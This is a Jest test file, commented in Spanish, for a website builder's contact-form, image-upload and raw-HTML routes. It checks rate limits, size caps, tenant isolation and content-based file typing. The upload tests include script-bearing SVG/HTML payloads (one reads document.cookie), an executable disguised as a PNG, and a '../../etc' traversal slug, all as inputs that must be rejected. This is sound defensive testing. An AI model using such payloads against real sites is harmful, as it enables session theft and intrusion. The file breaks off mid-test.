/**
 * Sitios web: rutas HTTP.
 *  - POST /api/public/web-sites/[slug]/contact  (formulario público, sin sesión)
 *  - POST /api/web-sites/asset-upload           (subida de imágenes, con permiso)
 *  - GET  /web/[slug]/raw                       (documento HTML propio, en sandbox)
 *
 * Reglas que protegen: la empresa sale SIEMPRE del sitio (nunca del cuerpo),
 * el tipo de imagen sale de los bytes (nunca de lo que declara el navegador) y
 * el HTML de un cliente se sirve inerte (CSP sandbox, sin scripts).
 *
 * Prisma: se espía el cliente real (DATABASE_URL falsa); cualquier consulta sin
 * simular lanza "Consulta no prevista". El rate limiter es el real.
 */

jest.mock('jose', () => ({ jwtVerify: jest.fn(), SignJWT: jest.fn() }));
jest.mock('next/server', () => ({ ...jest.requireActual('next/server'), after: jest.fn() }));
jest.mock('@/lib/email/mailer', () => ({ getAppUrl: () => 'https://app.test' }));
jest.mock('@/lib/observability', () => ({ captureException: jest.fn() }));
jest.mock('@/lib/notifications/company-notification', () => ({ notifyCompany: jest.fn() }));
jest.mock('@/lib/workflows/engine', () => ({ emitWorkflowEvent: jest.fn() }));
jest.mock('@/lib/storage/blob', () => ({ put: jest.fn(), del: jest.fn() }));
jest.mock('@/lib/auth/guards', () => ({ ...jest.requireActual('@/lib/auth/guards'), requireAuthWithPermission: jest.fn() }));

import { after } from 'next/server';
import { POST as contactPOST } from '@/app/api/public/web-sites/[slug]/contact/route';
import { POST as uploadPOST } from '@/app/api/web-sites/asset-upload/route';
import { GET as rawGET } from '@/app/web/[slug]/raw/route';
import { AuthError, ModuleNotEnabledError, requireAuthWithPermission } from '@/lib/auth/guards';
import { notifyCompany } from '@/lib/notifications/company-notification';
import { captureException } from '@/lib/observability';
import { prisma } from '@/lib/prisma';
import { del, put } from '@/lib/storage/blob';
import { WORKFLOW_TRIGGER_DEFINITIONS } from '@/lib/workflows/types';
import { emitWorkflowEvent } from '@/lib/workflows/engine';
import { createBlock, type WebSiteBlock } from '@/lib/web-sites/blocks';
import * as service from '@/modules/web-sites/services/web-sites.service';
import { MAX_COMPANY_ASSET_BYTES } from '@/modules/web-sites/services/web-sites.service';

// ---------------------------------------------------------------------------
// Utilidades
// ---------------------------------------------------------------------------

type Mocks = Record<string, jest.Mock>;
type Delegate = Record<string, (...args: unknown[]) => unknown>;
type Row = Record<string, unknown>;

const MODEL_METHODS = {
  webSite: ['findUnique', 'findFirst'],
  webSiteAsset: ['count', 'create', 'aggregate'],
  webSiteMessage: ['create', 'count'],
} as const;

interface Db {
  webSite: Mocks;
  webSiteAsset: Mocks;
  webSiteMessage: Mocks;
}

function installDb(): Db {
  const db: Record<string, Mocks> = {};
  for (const [model, methods] of Object.entries(MODEL_METHODS)) {
    db[model] = {};
    const delegate = (prisma as unknown as Record<string, Delegate>)[model]!;
    for (const method of methods) {
      db[model]![method] = jest.spyOn(delegate, method).mockImplementation(() => {
        throw new Error(`Consulta no prevista: ${model}.${method}`);
      }) as unknown as jest.Mock;
    }
  }
  return db as unknown as Db;
}

function argsOf(mock: jest.Mock, call = 0): { where: Row; data: Row; select?: Row } {
  return mock.mock.calls[call]![0] as { where: Row; data: Row; select?: Row };
}

function expectNoDbAccess(db: Db) {
  for (const model of Object.values(db)) for (const mock of Object.values(model as Mocks)) expect(mock).not.toHaveBeenCalled();
}

let db: Db;

beforeEach(() => {
  jest.restoreAllMocks();
  jest.resetAllMocks();
  db = installDb();
});

afterAll(() => jest.restoreAllMocks());

const SITE_ID = 'site-1';
const COMPANY = 'company-site';

/** Fila con la forma de PUBLIC_SELECT. */
function publicRow(over: Row = {}): Row {
  return {
    id: SITE_ID,
    companyId: COMPANY,
    name: 'Solar Sur',
    slug: 'solar-sur',
    mode: 'GUIDED',
    status: 'PUBLISHED',
    seoTitle: 'Solar Sur: paneles para tu hogar',
    seoDescription: 'Instalamos paneles solares en toda la Región del Biobío.',
    indexable: true,
    logoUrl: null,
    ogImageUrl: null,
    publishedBlocks: [{ ...createBlock('hero'), title: 'Paneles solares' }, { ...createBlock('contact'), showForm: true }],
    publishedTheme: {},
    publishedHtml: null,
    publishedAt: new Date('2026-09-03T12:00:00.000Z'),
    customDomain: null,
    customDomainVerifiedAt: null,
    company: { businessName: 'Solar SpA', status: 'ACTIVE', features: { hasWebSites: true } },
    ...over,
  };
}

// ---------------------------------------------------------------------------
// POST contacto
// ---------------------------------------------------------------------------

describe('POST /api/public/web-sites/[slug]/contact', () => {
  const VALID = { name: 'Ana Pérez', email: 'ANA@Correo.cl', phone: '+56 9 1234 5678', message: 'Quiero cotizar paneles solares para mi casa' };
  let ipCounter = 0;
  /** Una IP distinta por petición: el limitador es real y global al archivo. */
  const nextIp = () => {
    ipCounter += 1;
    return `10.20.${Math.floor(ipCounter / 250)}.${(ipCounter % 250) + 1}`;
  };

  function post(body: unknown, options: { ip?: string; raw?: string } = {}) {
    return new Request('https://app.test/api/public/web-sites/solar-sur/contact', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-forwarded-for': options.ip ?? nextIp() },
      body: options.raw ?? JSON.stringify(body),
    });
  }
  const ctx = (slug = 'solar-sur') => ({ params: Promise.resolve({ slug }) });

  function siteWithForm(over: Row = {}, recentMessages = 0) {
    db.webSite.findUnique.mockResolvedValue(publicRow(over));
    db.webSiteMessage.count.mockResolvedValue(recentMessages); // mensajes de la última hora (límite en la base)
    db.webSiteMessage.create.mockResolvedValue({ id: 'msg-1' });
  }

  const runAfter = async () => {
    expect(after).toHaveBeenCalledTimes(1);
    const task = jest.mocked(after).mock.calls[0]![0] as () => Promise<void>;
    await task();
  };

  it('honeypot lleno: responde 200 {success:true} como si nada, sin consultar el sitio ni crear mensaje', async () => {
    siteWithForm();

    const res = await contactPOST(post({ ...VALID, website: 'http://spam.example' }), ctx());

    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ success: true, data: null });
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
    expect(db.webSite.findUnique).not.toHaveBeenCalled();
    expect(after).not.toHaveBeenCalled();
    expect(notifyCompany).not.toHaveBeenCalled();
  });

  it('honeypot lleno aunque el resto del cuerpo sea inválido: igual 200 y nada se registra (el bot no aprende qué falló)', async () => {
    const res = await contactPOST(post({ website: 'x' }), ctx());
    expect(res.status).toBe(200);
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
  });

  it('honeypot vacío (un humano): el mensaje se procesa con normalidad', async () => {
    siteWithForm();
    const res = await contactPOST(post({ ...VALID, website: '' }), ctx());
    expect(res.status).toBe(200);
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(1);
  });

  it.each([
    ['sin nombre', { ...VALID, name: '' }, /Escribe tu nombre/],
    ['correo inválido', { ...VALID, email: 'no-es-correo' }, /correo válido/],
    ['mensaje demasiado corto', { ...VALID, message: 'hola' }, /Cuéntanos en qué podemos ayudarte/],
    ['mensaje demasiado largo', { ...VALID, message: 'x'.repeat(2001) }, /hasta 2000 caracteres/],
    ['teléfono con letras', { ...VALID, phone: 'llámame' }, /teléfono solo puede llevar/],
    ['cuerpo null', null, /./],
    ['cuerpo que no es un objeto', 'hola', /./],
  ])('cuerpo inválido (%s): 400 con mensaje útil y sin tocar la base', async (_label, body, message) => {
    const res = await contactPOST(post(body), ctx());
    const json = await res.json();

    expect(res.status).toBe(400);
    expect(json.success).toBe(false);
    expect(json.error).toMatch(message);
    expectNoDbAccess(db);
    expect(after).not.toHaveBeenCalled();
  });

  it('JSON roto: 400 "Solicitud inválida"', async () => {
    const res = await contactPOST(post(null, { raw: '{"name": "Ana", ' }), ctx());
    expect(res.status).toBe(400);
    expect(await res.json()).toEqual({ success: false, error: 'Solicitud inválida' });
    expectNoDbAccess(db);
  });

  it('sitio inexistente: 404 y no se crea nada', async () => {
    db.webSite.findUnique.mockResolvedValue(null);

    const res = await contactPOST(post(VALID), ctx('no-existe'));

    expect(res.status).toBe(404);
    expect(await res.json()).toEqual({ success: false, error: 'Este formulario ya no está disponible' });
    expect(argsOf(db.webSite.findUnique).where).toEqual({ slug: 'no-existe' });
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
    expect(after).not.toHaveBeenCalled();
  });

  it('slug con formato inválido: 404 sin consultar la base', async () => {
    const res = await contactPOST(post(VALID), ctx('../../etc'));
    expect(res.status).toBe(404);
    expectNoDbAccess(db);
  });

  it.each([
    ['contacto sin formulario', [{ ...createBlock('contact'), showForm: false, email: 'a@b.cl' }]],
    ['formulario en un bloque oculto', [{ ...createBlock('contact'), showForm: true, hidden: true }]],
    ['sin bloque de contacto', [{ ...createBlock('hero'), title: 'Solo portada' }]],
  ])('sitio publicado pero sin formulario activo (%s): 404 y no se crea nada', async (_label, blocks) => {
    siteWithForm({ publishedBlocks: blocks as WebSiteBlock[] });

    const res = await contactPOST(post(VALID), ctx());

    expect(res.status).toBe(404);
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
    expect(after).not.toHaveBeenCalled();
  });

  it.each([
    ['borrador', { status: 'DRAFT' }],
    ['archivado', { status: 'ARCHIVED' }],
    ['empresa suspendida', { company: { businessName: 'X', status: 'SUSPENDED', features: { hasWebSites: true } } }],
    ['empresa sin el módulo', { company: { businessName: 'X', status: 'ACTIVE', features: { hasWebSites: false } } }],
  ])('sitio no visible al público (%s): 404', async (_label, over) => {
    siteWithForm(over);
    const res = await contactPOST(post(VALID), ctx());
    expect(res.status).toBe(404);
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
  });

  it('límite por IP: tras 5 mensajes la sexta petición recibe 429 con Retry-After y no crea mensaje; otra IP no se ve afectada', async () => {
    siteWithForm();
    const ip = '203.0.113.7';

    const statuses: number[] = [];
    let last: Response | undefined;
    for (let i = 0; i < 6; i += 1) {
      last = await contactPOST(post(VALID, { ip }), ctx());
      statuses.push(last.status);
    }

    expect(statuses).toEqual([200, 200, 200, 200, 200, 429]);
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(5);
    const retryAfter = Number(last!.headers.get('Retry-After'));
    expect(Number.isInteger(retryAfter)).toBe(true);
    expect(retryAfter).toBeGreaterThanOrEqual(1);
    expect(retryAfter).toBeLessThanOrEqual(3600);
    expect(await last!.json()).toMatchObject({ success: false });

    const other = await contactPOST(post(VALID, { ip: '203.0.113.8' }), ctx());
    expect(other.status).toBe(200);
  });

  it('límite por IP: una IP bloqueada no llega ni a leer el cuerpo ni a consultar el sitio', async () => {
    siteWithForm();
    const ip = '203.0.113.50';
    for (let i = 0; i < 5; i += 1) await contactPOST(post(VALID, { ip }), ctx());
    db.webSite.findUnique.mockClear();

    const res = await contactPOST(post(null, { ip, raw: 'no es json' }), ctx());

    expect(res.status).toBe(429); // no 400: se corta antes de parsear
    expect(db.webSite.findUnique).not.toHaveBeenCalled();
  });

  it('límite por sitio: pasados 60 mensajes por hora, aunque vengan de IPs distintas, responde 429', async () => {
    siteWithForm({ id: 'site-flood' });

    const statuses: number[] = [];
    for (let i = 0; i < 61; i += 1) statuses.push((await contactPOST(post(VALID), ctx())).status);

    expect(statuses.slice(0, 60).every((status) => status === 200)).toBe(true);
    expect(statuses[60]).toBe(429);
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(60);
  });

  it('límite en la base de datos: con 60 mensajes en la última hora responde 429 y no crea otro; con 59 todavía acepta', async () => {
    siteWithForm({ id: 'site-db-limit' }, 60);
    const blocked = await contactPOST(post(VALID), ctx());
    expect(blocked.status).toBe(429);
    expect(db.webSiteMessage.create).not.toHaveBeenCalled();
    expect(after).not.toHaveBeenCalled();

    siteWithForm({ id: 'site-db-limit-2' }, 59);
    const accepted = await contactPOST(post(VALID), ctx());
    expect(accepted.status).toBe(200);
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(1);
  });

  it('el recuento de la base es del sitio y de la empresa DEL SITIO (no del cuerpo) y mira la última hora', async () => {
    siteWithForm({ id: 'site-db-scope' });
    const before = Date.now();

    await contactPOST(post({ ...VALID, companyId: 'otra', siteId: 'otro-sitio' }), ctx());

    const { where } = argsOf(db.webSiteMessage.count);
    expect(where).toMatchObject({ companyId: COMPANY, siteId: 'site-db-scope' });
    const since = (where.createdAt as { gte: Date }).gte.getTime();
    expect(since).toBeGreaterThanOrEqual(before - 60 * 60_000);
    expect(since).toBeLessThanOrEqual(Date.now() - 60 * 60_000);
  });

  describe('tamaño del cuerpo (64 KB)', () => {
    const LIMIT = 64 * 1024;
    /** Cuerpo JSON válido de exactamente `chars` caracteres (el relleno va en un campo que el esquema descarta). */
    const bodyOf = (chars: number) => {
      const base = JSON.stringify({ ...VALID, pad: '' });
      return JSON.stringify({ ...VALID, pad: 'x'.repeat(chars - base.length) });
    };

    it('un cuerpo de más de 64 KB responde 413 sin consultar el sitio ni guardar (aunque sea JSON válido)', async () => {
      siteWithForm();
      const raw = bodyOf(LIMIT + 1);
      expect(raw).toHaveLength(LIMIT + 1);

      const res = await contactPOST(post(null, { raw }), ctx());

      expect(res.status).toBe(413);
      expect(await res.json()).toEqual({ success: false, error: 'El formulario es demasiado largo' });
      expectNoDbAccess(db);
      expect(after).not.toHaveBeenCalled();
    });

    it('un mensaje de texto enorme (70 000 caracteres) también es 413, no 400', async () => {
      const res = await contactPOST(post({ ...VALID, message: 'x'.repeat(70_000) }), ctx());
      expect(res.status).toBe(413);
      expect(db.webSiteMessage.create).not.toHaveBeenCalled();
    });

    it('un cuerpo de exactamente 64 KB todavía se procesa', async () => {
      siteWithForm();
      const raw = bodyOf(LIMIT);
      expect(raw).toHaveLength(LIMIT);

      const res = await contactPOST(post(null, { raw }), ctx());

      expect(res.status).toBe(200);
      expect(db.webSiteMessage.create).toHaveBeenCalledTimes(1);
    });

    it('si Content-Length declara más de 64 KB responde 413 sin leer el cuerpo', async () => {
      siteWithForm();
      const req = new Request('https://app.test/api/public/web-sites/solar-sur/contact', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-forwarded-for': nextIp(), 'content-length': String(LIMIT + 1) },
        body: JSON.stringify(VALID),
      });
      const readBody = jest.spyOn(req, 'text');

      const res = await contactPOST(req, ctx());

      expect(res.status).toBe(413);
      expect(readBody).not.toHaveBeenCalled();
      expectNoDbAccess(db);
    });

    it('un Content-Length de exactamente 64 KB todavía se procesa (el tope es estricto)', async () => {
      siteWithForm();
      const raw = JSON.stringify(VALID);
      const req = new Request('https://app.test/api/public/web-sites/solar-sur/contact', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-forwarded-for': nextIp(), 'content-length': String(LIMIT) },
        body: raw,
      });
      expect((await contactPOST(req, ctx())).status).toBe(200);
    });

    it('un Content-Length dentro del límite no bloquea', async () => {
      siteWithForm();
      const raw = JSON.stringify(VALID);
      const req = new Request('https://app.test/api/public/web-sites/solar-sur/contact', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-forwarded-for': nextIp(), 'content-length': String(raw.length) },
        body: raw,
      });
      expect((await contactPOST(req, ctx())).status).toBe(200);
    });
  });

  it('éxito: la empresa sale del SITIO, nunca del cuerpo (companyId y siteId del cuerpo se ignoran)', async () => {
    siteWithForm({ publishedBlocks: [{ ...createBlock('hero'), title: 'Paneles solares' }, { ...createBlock('contact'), id: 'contacto-1', showForm: true }] });

    const res = await contactPOST(post({ ...VALID, companyId: 'otra', siteId: 'otro-sitio', id: 'inyectado', readAt: '2020-01-01' }), ctx());

    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ success: true, data: null });

    // Lo que llega a la base lleva la empresa y el sitio del sitio publicado, y el formulario de contacto de ese sitio.
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(1);
    const data = argsOf(db.webSiteMessage.create).data;
    expect(data).toMatchObject({
      companyId: COMPANY,
      siteId: SITE_ID,
      name: 'Ana Pérez',
      email: 'ana@correo.cl',
      phone: '+56 9 1234 5678',
      message: VALID.message,
      formId: 'contacto-1',
      purpose: 'contact',
      destination: 'inbox',
    });
    expect(data.answers).toEqual(expect.arrayContaining([expect.objectContaining({ id: 'message', value: VALID.message })]));
    for (const forbidden of ['readAt', 'id', 'routedId']) expect(data).not.toHaveProperty(forbidden);
    expect(JSON.stringify(data)).not.toMatch(/otra|otro-sitio|inyectado/);
  });

  it('éxito sin teléfono: se guarda phone=null', async () => {
    siteWithForm();
    await contactPOST(post({ name: 'Ana', email: 'a@b.cl', message: 'Hola, quiero cotizar' }), ctx());
    expect(argsOf(db.webSiteMessage.create).data.phone).toBeNull();
  });

  it('after(): avisa a la empresa DEL SITIO y dispara la automatización WEB_SITE_MESSAGE_RECEIVED; nada de eso corre antes de responder', async () => {
    siteWithForm();

    const res = await contactPOST(post(VALID), ctx());

    expect(res.status).toBe(200);
    // Todavía no: el aviso y la automatización son I/O posterior a la respuesta.
    expect(notifyCompany).not.toHaveBeenCalled();
    expect(emitWorkflowEvent).not.toHaveBeenCalled();

    await runAfter();

    expect(notifyCompany).toHaveBeenCalledTimes(1);
    const [notifiedCompany, notification] = jest.mocked(notifyCompany).mock.calls[0]!;
    expect(notifiedCompany).toBe(COMPANY);
    expect(notification).toMatchObject({ severity: 'INFO', href: `/dashboard/web-sites/${SITE_ID}?tab=messages` });
    expect(notification.message).toContain('Ana Pérez');
    expect(notification.message.length).toBeLessThanOrEqual(500);
    // El push se ve en la pantalla bloqueada: sin correo, teléfono ni el texto del mensaje.
    expect(notification.pushMessage).toBe('Ana Pérez escribió desde "Solar Sur".');
    expect(notification.pushMessage).not.toMatch(/ana@correo|1234|paneles/i);

    expect(emitWorkflowEvent).toHaveBeenCalledTimes(1);
    expect(emitWorkflowEvent).toHaveBeenCalledWith(
      COMPANY,
      'WEB_SITE_MESSAGE_RECEIVED',
      expect.objectContaining({ siteId: SITE_ID, siteName: 'Solar Sur', senderName: 'Ana Pérez', senderEmail: 'ana@correo.cl', senderPhone: '+56 9 1234 5678', message: VALID.message, messageId: 'msg-1' })
    );
  });

  it('la automatización recibe todos los campos que el catálogo de disparadores declara para este evento', async () => {
    siteWithForm();
    await contactPOST(post(VALID), ctx());
    await runAfter();

    const payload = jest.mocked(emitWorkflowEvent).mock.calls[0]![2];
    for (const { field } of WORKFLOW_TRIGGER_DEFINITIONS.WEB_SITE_MESSAGE_RECEIVED.fields) expect(payload).toHaveProperty(field);
  });

  it('si el aviso a la campanita falla, se reporta y la automatización igual se dispara (el mensaje ya quedó guardado)', async () => {
    siteWithForm();
    jest.mocked(notifyCompany).mockRejectedValue(new Error('push caído'));

    const res = await contactPOST(post(VALID), ctx());
    await runAfter();

    expect(res.status).toBe(200);
    expect(db.webSiteMessage.create).toHaveBeenCalledTimes(1);
    expect(captureException).toHaveBeenCalledWith(expect.any(Error), expect.objectContaining({ module: 'sitios-web', companyId: COMPANY }));
    expect(emitWorkflowEvent).toHaveBeenCalledTimes(1);
  });

  it('si la base falla al guardar: 500 genérico, se reporta, y no se avisa a nadie', async () => {
    siteWithForm();
    db.webSiteMessage.create.mockRejectedValue(new Error('connection refused 10.0.0.5'));

    const res = await contactPOST(post(VALID), ctx());
    const json = await res.json();

    expect(res.status).toBe(500);
    expect(json.error).not.toMatch(/10\.0\.0\.5|connection/); // el detalle técnico no llega a la pantalla
    expect(captureException).toHaveBeenCalledTimes(1);
    expect(after).not.toHaveBeenCalled();
    expect(notifyCompany).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// POST asset-upload
// ---------------------------------------------------------------------------

describe('POST /api/web-sites/asset-upload', () => {
  const SESSION = { id: 'user-1', companyId: 'company-a', name: 'Ana', email: 'ana@empresa.cl', role: 'SALES' };
  const PNG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
  const JPEG = [0xff, 0xd8, 0xff, 0xe0];
  const WEBP = [0x52, 0x49, 0x46, 0x46, 0x24, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50];
  const bytes = (magic: number[], total = 32) => Uint8Array.from({ length: total }, (_, i) => magic[i] ?? 0);
  const ascii = (text: string) => new TextEncoder().encode(text);
  /** `File` acepta ArrayBuffer, no un Uint8Array genérico: se copia el tramo exacto de bytes. */
  const blobPart = (data: Uint8Array): ArrayBuffer => data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength) as ArrayBuffer;

  function upload(options: { siteId?: string | null; content?: Uint8Array; type?: string; name?: string; extra?: Record<string, string> | null; file?: boolean } = {}) {
    const form = new FormData();
    if (options.siteId !== null) form.append('siteId', options.siteId ?? 'site-1');
    for (const [key, value] of Object.entries(options.extra ?? {})) form.append(key, value);
    if (options.file !== false) form.append('file', new File([blobPart(options.content ?? bytes(PNG))], options.name ?? 'logo.png', { type: options.type ?? 'image/png' }));
    return new Request('https://app.test/api/web-sites/asset-upload', { method: 'POST', body: form });
  }

  function allowedSite(over: Row = {}) {
    db.webSite.findFirst.mockResolvedValue({ id: 'site-1', status: 'DRAFT', ...over });
    db.webSiteAsset.count.mockResolvedValue(0);
    db.webSiteAsset.aggregate.mockResolvedValue({ _sum: { sizeBytes: 0 } });
    db.webSiteAsset.create.mockImplementation(async ({ data }: { data: Row }) => ({ id: 'asset-1', ...data, alt: data.alt ?? null, createdAt: new Date('2026-09-10T00:00:00Z') }));
    jest.mocked(put).mockImplementation((async (pathname: string) => ({ url: `https://blob.test/${pathname}`, pathname })) as never);
  }

  beforeEach(() => {
    jest.mocked(requireAuthWithPermission).mockResolvedValue(SESSION as never);
  });

  it('sin permiso: 403, exige websites:write y no sube ni toca la base', async () => {
    jest.mocked(requireAuthWithPermission).mockRejectedValue(new AuthError('No autorizado para esta acción', 403));

    const res = await uploadPOST(upload());

    expect(res.status).toBe(403);
    expect(await res.json()).toEqual({ success: false, error: 'No autorizado para esta acción' });
    expect(requireAuthWithPermission).toHaveBeenCalledWith('websites:write');
    expect(put).not.toHaveBeenCalled();
    expectNoDbAccess(db);
  });

  it('empresa sin el módulo Sitios web: 403 con mensaje de plan, sin subir nada', async () => {
    jest.mocked(requireAuthWithPermission).mockRejectedValue(new ModuleNotEnabledError('hasWebSites'));

    const res = await uploadPOST(upload());

    expect(res.status).toBe(403);
    expect((await res.json()).error).toMatch(/Módulo no incluido en tu plan/);
    expect(put).not.toHaveBeenCalled();
  });

  it.each([
    ['un SVG con script declarado como image/png', ascii('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'), 'image/png', 'logo.png'],
    ['un SVG declarado como image/svg+xml', ascii('<?xml version="1.0"?><svg onload="alert(1)"/>'), 'image/svg+xml', 'logo.svg'],
    ['un HTML declarado como image/png', ascii('<html><body><script>alert(1)</script></body></html>'), 'image/png', 'foto.png'],
    ['un GIF (formato excluido a propósito)', ascii('GIF89a\u0001\u0000\u0001\u0000'), 'image/gif', 'animado.gif'],
    ['un PDF declarado como image/jpeg', ascii('%PDF-1.7 contenido'), 'image/jpeg', 'foto.jpg'],
    ['un ejecutable (cabecera MZ) con extensión .png', Uint8Array.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]), 'image/png', 'virus.png'],
    ['un RIFF que no es WEBP (WAV)', Uint8Array.from([0x52, 0x49, 0x46, 0x46, 0x24, 0, 0, 0, 0x57, 0x41, 0x56, 0x45]), 'image/webp', 'audio.webp'],
    ['una firma PNG truncada', Uint8Array.from([0x89, 0x50, 0x4e, 0x47]), 'image/png', 'roto.png'],
  ])('archivo que NO es una imagen real (%s): 400 y no se sube ni se registra', async (_label, content, type, name) => {
    allowedSite();

    const res = await uploadPOST(upload({ content, type, name }));

    expect(res.status).toBe(400);
    expect((await res.json()).error).toMatch(/JPG, PNG o WEBP/);
    expect(put).not.toHaveBeenCalled();
    expect(db.webSiteAsset.create).not.toHaveBeenCalled();
  });

  it('PNG real: sube a web-sites/<empresa de la sesión>/<sitio>/ y registra el asset', async () => {
    allowedSite();
    const content = bytes(PNG, 64);

    const res = await uploadPOST(upload({ content, name: 'logo.png', extra: { alt: 'Logo de Solar Sur' } }));
    const json = await res.json();

    expect(res.status).toBe(200);
    expect(json.success).toBe(true);

    expect(put).toHaveBeenCalledTimes(1);
    const [path, body, options] = jest.mocked(put).mock.calls[0]!;
    expect(path).toMatch(/^web-sites\/company-a\/site-1\/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\.png$/);
    expect(Buffer.from(body as Buffer).equals(Buffer.from(content))).toBe(true);
    expect(options).toEqual({ access: 'public', contentType: 'image/png', addRandomSuffix: false });

    expect(db.webSiteAsset.create).toHaveBeenCalledTimes(1);
    expect(argsOf(db.webSiteAsset.create).data).toEqual({
      companyId: 'company-a',
      siteId: 'site-1',
      url: `https://blob.test/${path}`,
      fileName: 'logo.png',
      mimeType: 'image/png',
      sizeBytes: content.length,
      alt: 'Logo de Solar Sur',
    });
    expect(json.data).toMatchObject({ id: 'asset-1', url: `https://blob.test/${path}`, mimeType: 'image/png', alt: 'Logo de Solar Sur' });
  });

  it.each([
    ['JPEG', JPEG, 'image/jpeg', 'jpg'],
    ['WEBP', WEBP, 'image/webp', 'webp'],
  ])('%s real: se acepta con su extensión y content-type reales', async (_label, magic, mime, extension) => {
    allowedSite();

    const res = await uploadPOST(upload({ content: bytes(magic), type: 'application/octet-stream', name: 'foto' }));

    expect(res.status).toBe(200);
    const [path, , options] = jest.mocked(put).mock.calls[0]!;
    expect(path).toMatch(new RegExp(`\\.${extension}$`));
    expect(options.contentType).toBe(mime);
  });

  it('el tipo sale de los bytes y no de lo que declara el navegador ni de la extensión del nombre', async () => {
    allowedSite();

    const res = await uploadPOST(upload({ content: bytes(PNG), type: 'image/webp', name: 'foto.svg' }));

    expect(res.status).toBe(200);
    const [path, , options] = jest.mocked(put).mock.calls[0]!;
    expect(path).toMatch(/\.png$/);
    expect(options.contentType).toBe('image/png');
    expect(argsOf(db.webSiteAsset.create).data.mimeType).toBe('image/png');
  });

  it('la empresa del archivo sale de la sesión: un companyId en el formulario se ignora', async () => {
    allowedSite();

    await uploadPOST(upload({ extra: { companyId: 'company-b' } }));

    expect(argsOf(db.webSite.findFirst).where).toEqual({ id: 'site-1', companyId: 'company-a' });
    const [path] = jest.mocked(put).mock.calls[0]!;
    expect(path).not.toContain('company-b');
    expect(argsOf(db.webSiteAsset.create).data.companyId).toBe('company-a');
  });

  it('archivo mayor a 4 MB: 413 sin leer el sitio ni subir', async () => {
    allowedSite();
    const tooBig = new Uint8Array(4 * 1024 * 1024 + 1);
    tooBig.set(PNG);

    const res = await uploadPOST(upload({ content: tooBig }));

    expect(res.status).toBe(413);
    expect((await res.json()).error).toMatch(/4 MB/);
    expect(put).not.toHaveBeenCalled();
    expect(db.webSite.findFirst).not.toHaveBeenCalled();
  });

  it('archivo de exactamente 4 MB: se acepta (el límite es estricto)', async () => {
    allowedSite();
    const exact = new Uint8Array(4 * 1024 * 1024);
    exact.set(PNG);

    const res = await uploadPOST(upload({ content: exact }));

    expect(res.status).toBe(200);
    expect(put).toHaveBeenCalledTimes(1);
  });

  it('sitio que no es de la empresa de la sesión: 400 y no se sube el archivo', async () => {
    db.webSite.findFirst.mockResolvedValue(null);

    const res = await uploadPOST(upload({ siteId: 'site-de-otra-empresa' }));

    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe('Sitio no encontrado');
    expect(argsOf(db.webSite.findFirst).where).toEqual({ id: 'site-de-otra-empresa', companyId: 'company-a' });
    expect(put).not.toHaveBeenCalled();
    expect(db.webSiteAsset.create).not.toHaveBeenCalled();
  });

  it('sitio archivado o biblioteca llena (60 imágenes): 400 antes de subir', async () => {
    allowedSite({ status: 'ARCHIVED' });
    const archived = await uploadPOST(upload());
    expect(archived.status).toBe(400);
    expect((await archived.json()).error).toMatch(/archivado/);

    allowedSite();
    db.webSiteAsset.count.mockResolvedValue(60);
    const full = await uploadPOST(upload());
    expect(full.status).toBe(400);
    expect((await full.json()).error).toMatch(/hasta 60 imágenes/);

    expect(put).not.toHaveBeenCalled();
  });

  it('tope de almacenamiento por empresa: si lo ya usado más este archivo lo supera, 400 y no se sube', async () => {
    allowedSite();
    const content = bytes(PNG, 1000);
    db.webSiteAsset.aggregate.mockResolvedValue({ _sum: { sizeBytes: MAX_COMPANY_ASSET_BYTES - 999 } }); // falta 1 byte de espacio

    const res = await uploadPOST(upload({ content }));

    expect(res.status).toBe(400);
    expect((await res.json()).error).toMatch(/límite de 300 MB/);
    expect(argsOf(db.webSiteAsset.aggregate)).toMatchObject({ where: { companyId: 'company-a' } });
    expect(put).not.toHaveBeenCalled();
    expect(db.webSiteAsset.create).not.toHaveBeenCalled();
  });

  it('tope de almacenamiento por empresa: el tamaño del archivo entrante cuenta (justo en el límite se acepta)', async () => {
    allowedSite();
    const content = bytes(PNG, 1000);
    db.webSiteAsset.aggregate.mockResolvedValue({ _sum: { sizeBytes: MAX_COMPANY_ASSET_BYTES - 1000 } });

    const res = await uploadPOST(upload({ content }));

    expect(res.status).toBe(200);
    expect(put).toHaveBeenCalledTimes(1);
  });

  it('si el registro del asset falla después de subir, borra el archivo huérfano del almacenamiento y responde 500', async () => {
    allowedSite();
    db.webSiteAsset.create.mockRejectedValue(new Error('P1001 base caída'));
    jest.mocked(del).mockResolvedValue(undefined);

    const res = await uploadPOST(upload());

    expect(res.status).toBe(500);
    expect(put).toHaveBeenCalledTimes(1);
    const [uploadedPath] = jest.mocked(put).mock.calls[0]!;
    expect(del).toHaveBeenCalledTimes(1);
    expect(del).toHaveBeenCalledWith(`https://blob.test/${uploadedPath}`);
    expect(captureException).toHaveBeenCalledTimes(1);
  });

  it('si además falla el borrado del huérfano, el error que se reporta sigue siendo el del registro (no se enmascara)', async () => {
    allowedSite();
    db.webSiteAsset.create.mockRejectedValue(new Error('P1001 base caída'));
    jest.mocked(del).mockRejectedValue(new Error('R2 timeout'));

    const res = await uploadPOST(upload());

    expect(res.status).toBe(500);
